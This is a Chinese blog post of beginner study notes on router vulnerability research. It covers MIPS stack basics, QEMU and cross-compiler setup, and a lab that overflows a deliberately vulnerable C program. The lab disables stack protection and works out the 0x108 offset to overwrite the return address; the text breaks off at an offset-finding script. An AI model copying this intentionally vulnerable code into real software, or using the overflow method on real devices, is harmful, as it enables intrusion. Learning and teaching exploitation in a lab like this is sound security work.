<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>路由器漏洞挖掘初探 | EPs1l0h's Castle</title><meta name="author" content="EPs1l0h"><meta name="copyright" content="EPs1l0h"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="最近刚入门IOT安全，孩子一脸懵，学长推荐了一本书 《揭秘家用路由器0day漏洞挖掘技术》，慢慢啃一会儿先。 一些前置芝士各种环境，书中主要介绍了MIPS架构，基于QEMU开发运行环境，然后用buildroot搭建编译环境，这里先用轻量级的 mips-linux-gnu-gcc 搭建编译环境，用 qemu-mips-static 搭建用户级的运行环境，先凑合用吧。 各种工具：binwalk，ida">
<meta property="og:type" content="article">
<meta property="og:title" content="路由器漏洞挖掘初探">
<meta property="og:url" content="https://example.com/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/index.html">
<meta property="og:site_name" content="EPs1l0h&#39;s Castle">
<meta property="og:description" content="最近刚入门IOT安全，孩子一脸懵，学长推荐了一本书 《揭秘家用路由器0day漏洞挖掘技术》，慢慢啃一会儿先。 一些前置芝士各种环境，书中主要介绍了MIPS架构，基于QEMU开发运行环境，然后用buildroot搭建编译环境，这里先用轻量级的 mips-linux-gnu-gcc 搭建编译环境，用 qemu-mips-static 搭建用户级的运行环境，先凑合用吧。 各种工具：binwalk，ida">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://github.com/EPs1l0h/EPs1l0h.github.io/blob/main/medias/cover/cover1.jpg?raw=true">
<meta property="article:published_time" content="2024-04-18T08:59:23.000Z">
<meta property="article:modified_time" content="2024-05-13T07:54:22.705Z">
<meta property="article:author" content="EPs1l0h">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://github.com/EPs1l0h/EPs1l0h.github.io/blob/main/medias/cover/cover1.jpg?raw=true"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://example.com/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '路由器漏洞挖掘初探',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-05-13 15:54:22'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">50</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://github.com/EPs1l0h/EPs1l0h.github.io/blob/main/medias/cover/cover1.jpg?raw=true')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">EPs1l0h's Castle</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">路由器漏洞挖掘初探</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-04-18T08:59:23.000Z" title="发表于 2024-04-18 16:59:23">2024-04-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-05-13T07:54:22.705Z" title="更新于 2024-05-13 15:54:22">2024-05-13</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="路由器漏洞挖掘初探"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>最近刚入门IOT安全，孩子一脸懵，学长推荐了一本书 《揭秘家用路由器0day漏洞挖掘技术》，慢慢啃一会儿先。</p>
<h1 id="一些前置芝士"><a href="#一些前置芝士" class="headerlink" title="一些前置芝士"></a>一些前置芝士</h1><p>各种环境，书中主要介绍了MIPS架构，基于QEMU开发运行环境，然后用buildroot搭建编译环境，这里先用轻量级的 <code>mips-linux-gnu-gcc</code> 搭建编译环境，用 <code>qemu-mips-static</code> 搭建用户级的运行环境，先凑合用吧。</p>
<p>各种工具：binwalk，idapro及相关插件，qemu，MIPS交叉编译环境等</p>
<p>还有就是 MIPS 堆栈原理，比较重要的有：</p>
<ol>
<li>栈操作：MIPS32 架构堆栈与x86架构一样，都是向低地址增长的。但在MIPS32 架构中没有EBP(栈底指针)，进入一个函数时，需要将当前指针向下移动 n 比特，这个大小为 n 比特的存储空间就是此函数的 Stack Frame 的存储区域。此后，栈指针便不再移动，只能在函数返回时将栈指针加上这个偏移量恢复栈现场。由于不能随便移动栈指针，所以寄存器压栈和出栈时都必须指定偏移量。</li>
<li>调用:如果函数A调用函数B，调用者函数(数A)会在自己的栈顶预留一部分空间来保存被调用者(函数B)的参数，我们称之为调用参数空间。</li>
<li>参数传递方式:前4个传入的参数通过<code>Sa0~Sa3</code>传递。有些函数的参数可能会超过4个此时，多余的参数会被放入调用参数空间。x86架构下的所有参数都是通过堆传递的。</li>
<li>返回地址:在x86架构中，使用<code>cal</code>命令调用函数时，会先将当前执行位置压入堆栈，MIPS的调用指令把函数的返回地址直接存入SRA寄存器而不是堆中。</li>
</ol>
<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>VMware：Ubuntu 23.10.1，踩了很多坑，可以用老点的版本，比如 18.04。</p>
<h2 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install binwalk</span><br></pre></td></tr></table></figure>
<h2 id="交叉编译环境"><a href="#交叉编译环境" class="headerlink" title="交叉编译环境"></a>交叉编译环境</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y gcc-mips-linux-gnu</span><br><span class="line">sudo apt-get install -y gcc-mipsel-linux-gnu</span><br></pre></td></tr></table></figure>
<p>使用方法：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ep@ep-ubuntu23:~/Desktop$ mips-linux-gnu-gcc --<span class="built_in">help</span></span><br><span class="line">ep@ep-ubuntu23:~/Desktop$ mipsel-linux-gnu-gcc --<span class="built_in">help</span></span><br></pre></td></tr></table></figure>
<h2 id="QEMU"><a href="#QEMU" class="headerlink" title="QEMU"></a>QEMU</h2><h3 id="qemu-user-mode"><a href="#qemu-user-mode" class="headerlink" title="qemu-user-mode"></a>qemu-user-mode</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu-user</span><br><span class="line">sudo apt-get install qemu-user-static</span><br></pre></td></tr></table></figure>
<p>使用方法：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ep@ep-ubuntu23:~/Desktop$ qemu-mips-static --<span class="built_in">help</span></span><br><span class="line">ep@ep-ubuntu23:~/Desktop$ qemu-mipsel-static --<span class="built_in">help</span></span><br></pre></td></tr></table></figure>
<p>静态链接运行：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ep@ep-ubuntu23:~/Desktop/pwnWorkspace$ mips-linux-gnu-gcc -static hello_mips.c -o hello_mips</span><br><span class="line">ep@ep-ubuntu23:~/Desktop/pwnWorkspace$ qemu-mips-static hello_mips</span><br><span class="line">hello mips</span><br></pre></td></tr></table></figure>
<p>动态链接运行：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ep@ep-ubuntu23:~/Desktop/pwnWorkspace$ mips-linux-gnu-gcc hello_mips.c -o hello_mips</span><br><span class="line">ep@ep-ubuntu23:~/Desktop/pwnWorkspace$ qemu-mips hello_mips</span><br><span class="line">qemu-mips: Could not open <span class="string">&#x27;/lib/ld.so.1&#x27;</span>: No such file or directory</span><br></pre></td></tr></table></figure>
<p>由于我们用的是 user 模式，所以此时会提示缺少库文件，解决方法：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ep@ep-ubuntu23:~/Desktop/pwnWorkspace$ qemu-mips -L <span class="string">&quot;/usr/mips-linux-gnu&quot;</span> hello_mips</span><br><span class="line">hello mips</span><br></pre></td></tr></table></figure>
<h3 id="qemu-system-mode"><a href="#qemu-system-mode" class="headerlink" title="qemu-system-mode"></a>qemu-system-mode</h3><p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/apexchu/p/15801244.html">qemu-mips环境搭建跳坑指南</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_53195006/article/details/129883054">QEMU搭建X86_64 + Ubuntu虚拟系统环境_ubuntu qemu-CSDN博客</a></p>
<ol>
<li><p>安装依赖</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install zlib1g-dev</span><br><span class="line">sudo apt-get install libglib2.0-0</span><br><span class="line">sudo apt-get install libglib2.0-dev</span><br><span class="line">sudo apt-get install libtool</span><br><span class="line">sudo apt-get install libsdl1.2-dev</span><br><span class="line">sudo apt-get install libpixman-1-dev</span><br><span class="line">sudo apt-get install autoconf</span><br><span class="line">sudo apt-get install qemu-user-static</span><br><span class="line">sudo apt-get install qemu-system</span><br><span class="line">git <span class="built_in">clone</span> https://gitlab.com/qemu-project/qemu.git</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置 qemu 虚拟机网络环境</p>
<p>使用网桥的方法使宿主机与虚拟机互联,然后通过NAT的方式使虚拟机与外网链接，注意一点,如果不进行NAT设置的话,虚拟机是不能访问外网的</p>
<blockquote>
<p>这里一开始踩了一个大坑，原来设置的是192.168.122.xxxx，和virbr0撞了，最后通过 <code>route -n</code> 查路由表才发现了这个问题，最后全部改成123所在的子网才搞好</p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install bridge-utils uml-utilities</span><br><span class="line">sudo brctl addbr br0</span><br><span class="line">sudo ifconfig br0 192.168.123.1/24 up</span><br><span class="line">sudo tunctl -t tap0</span><br><span class="line">sudo ifconfig tap0 192.168.123.11/24 up</span><br><span class="line">sudo brctl addif br0 tap0</span><br></pre></td></tr></table></figure>
</li>
<li><p>下载qemu虚拟机的内核和镜像</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://people.debian.org/~aurel32/qemu/mips/vmlinux-3.2.0-4-4kc-malta</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/mips/debian_wheezy_mips_standard.qcow2</span><br></pre></td></tr></table></figure>
<p>默认用户名密码是:root/root</p>
</li>
<li><p>在本机配置dhcp,dns服务</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dnsmasq --strict-order --except-interface=lo --interface=br0 --listen-address=192.168.123.1 --bind-interfaces --dhcp-range=192.168.123.2,192.168.123.254 --conf-file=<span class="string">&quot;&quot;</span> --pid-file=/var/run/qemu-dhcp-virbr0.pid --dhcp-leasefile=/var/run/qemu-dhcp-virbr0.leases --dhcp-no-override</span><br></pre></td></tr></table></figure>
</li>
<li><p>把以下 sh 文件和 <code>vmlinux-3.2.0-4-4kc-malta</code> 以及 <code>debian_wheezy_mips_standard.qcow2</code> 放在同一目录，即可启动虚拟机并与宿主机互通</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">sudo qemu-system-mips -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mips_standard.qcow2 -append <span class="string">&quot;root=/dev/sda1 console=tty0&quot;</span> -netdev tap,<span class="built_in">id</span>=tapnet,ifname=tap0,script=no -device rtl8139,netdev=tapnet -nographic</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>-nographic</code> 会直接在当前终端启动，而不是另起终端</p>
</blockquote>
</li>
<li><p>在宿主机开启端口转发，配置iptable，进行连接外网配置</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo sysctl -w net.ipv4.ip_forward=1</span><br><span class="line">sudo sysctl -p /etc/sysctl.conf</span><br><span class="line">sudo iptables -t nat -A POSTROUTING -s <span class="string">&quot;192.168.123.0/255.255.255.0&quot;</span> ! -d <span class="string">&quot;192.168.123.0/255.255.255.0&quot;</span> -j MASQUERADE</span><br><span class="line">sudo iptables -N vm-service</span><br><span class="line">sudo iptables -A vm-service -j ACCEPT</span><br><span class="line">sudo iptables -A FORWARD -s 192.168.123.0/24 -j   vm-service</span><br></pre></td></tr></table></figure>
<p>重启虚拟机，即可与外网互通</p>
<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/image-20240427175658672.png" alt="image-20240427175658672"></p>
</li>
</ol>
<h1 id="一次-MIPS-缓冲区溢出利用实践"><a href="#一次-MIPS-缓冲区溢出利用实践" class="headerlink" title="一次 MIPS 缓冲区溢出利用实践"></a>一次 MIPS 缓冲区溢出利用实践</h1><h2 id="Crash"><a href="#Crash" class="headerlink" title="Crash"></a>Crash</h2><p>源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">do_system</span><span class="params">(<span class="type">int</span> code, <span class="type">char</span> *cmd)</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">255</span>];</span><br><span class="line">    system(cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">char</span> ch;</span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> fileLen = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">fileData</span>;</span></span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">0</span> ==stat(<span class="string">&quot;passwd&quot;</span>, &amp;fileData))</span><br><span class="line">        fileLen = fileData.st_size;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>((fp = fopen(<span class="string">&quot;passwd&quot;</span>, <span class="string">&quot;rb&quot;</span>)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Cannot open file passwd!\n&quot;</span>);   </span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ch = fgetc(fp);</span><br><span class="line">    <span class="keyword">while</span>(count &lt;= fileLen) &#123;</span><br><span class="line">        buf[count++] = ch;</span><br><span class="line">        ch = fgetc(fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    buf[--count] = <span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(buf, <span class="string">&quot;adminpwd&quot;</span>)) &#123;</span><br><span class="line">        do_system(count, <span class="string">&quot;ls -l&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;you have an invalid password!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用如下命令编译（新版的 mips-gcc 加入了一些防止栈溢出的机制比如 stack guard，我们可以用 <code>-fno-stack-protector</code> 参数取消该保护机制），然后在需要的 <code>passwd</code> 文件中写入一堆 A 字符，运行</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mips-linux-gnu-gcc -fno-stack-protector vuln_system.c -o vuln_system -static</span><br><span class="line">python3 -c <span class="string">&quot;print(&#x27;A&#x27; * 600)&quot;</span> &gt; passwd</span><br><span class="line">qemu-mips-static vuln_system</span><br></pre></td></tr></table></figure>
<p>可以看到程序在验证完密码是否正确以后崩溃</p>
<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/image-20240418170941376.png" alt="image-20240418170941376"></p>
<p>我们使用IDA对程序进行调试，方法如下：</p>
<p>使用如下命令启动待调试的目标程序：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;print(&#x27;A&#x27;*0x19C)&quot;</span> &gt; passwd</span><br><span class="line">qemu-mips-static -g 1234 vuln_system</span><br></pre></td></tr></table></figure>
<p>然后调整 IDA 的 remote GDB debugger 参数</p>
<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/image-20240418171616208.png" alt="image-20240418171616208"></p>
<p>在文件读入循环之前下断点：</p>
<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/image-20240418173644974.png" alt="image-20240418173644974"></p>
<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/image-20240418173614592.png" alt="image-20240418173614592"></p>
<p>可以看到此时的 <code>saved_ra</code> 局部变量为 <code>0x400AA0</code></p>
<p>把整个循环运行完毕，再次查看该局部变量，发现已被覆盖</p>
<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/image-20240418174008210.png" alt="image-20240418174008210"></p>
<p>不过好像因为目前版本的 <code>mips-linux-gnu-gcc</code> 加入了 <code>stack_guard</code>，这个在执行到 <code>saved_ra</code> 赋值给 <code>RA</code> 寄存器以前进程就被结束了，所以没法继续模拟了。</p>
<h2 id="栈溢出覆盖saved-ra局部变量进而覆盖RA寄存器"><a href="#栈溢出覆盖saved-ra局部变量进而覆盖RA寄存器" class="headerlink" title="栈溢出覆盖saved_ra局部变量进而覆盖RA寄存器"></a>栈溢出覆盖saved_ra局部变量进而覆盖RA寄存器</h2><p>通过静态分析，我们可以知道通过赋值循环，我们把 <code>passwd</code> 中的数据覆盖到了从 <code>*(fp + *(fp + 32)+ 188)</code> 的栈空间里，<code>*(fp + 32)</code> 是一个 <code>count</code> 下标计数器。</p>
<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/image-20240418183826827.png" alt="image-20240418183826827"></p>
<p>我们再来看最后的 <code>saved_ra</code> 局部变量所在的栈空间地址，发现是在 <code>*(sp + 452)</code> 这个位置，而此时 sp 和 fp 指向相同的地址，所以实际的偏移是 <code>452 - 188 = 264 = 0x108</code>，也就是说我们的 payload 可以是 <code>0x108 * &#39;A&#39; + addr</code>，就可以达到覆写 <code>RA</code> 寄存器的目的。</p>
<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/image-20240418184042630.png" alt="image-20240418184042630"></p>
<h2 id="漏洞利用开发过程"><a href="#漏洞利用开发过程" class="headerlink" title="漏洞利用开发过程"></a>漏洞利用开发过程</h2><h3 id="劫持PC"><a href="#劫持PC" class="headerlink" title="劫持PC"></a>劫持PC</h3><p>比如往 <code>passwd</code> 文件里面写 600 个A，造成缓冲区溢出，程序崩溃</p>
<h3 id="确定偏移"><a href="#确定偏移" class="headerlink" title="确定偏移"></a>确定偏移</h3><p>方法一：字符脚本（类似于fuzz）</p>
<p>建立大量字符，在这些字符中任取四位且这四位的值在集合中唯一，这样我们就可以找出覆盖到PC的4个字符在字符集中的偏移，当然得保证这四个字符都必须是不可执行的地址，下面放一个脚本示例：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#patternLocOffset.py</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">生成定位字符串：轮子直接使用</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> </span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> 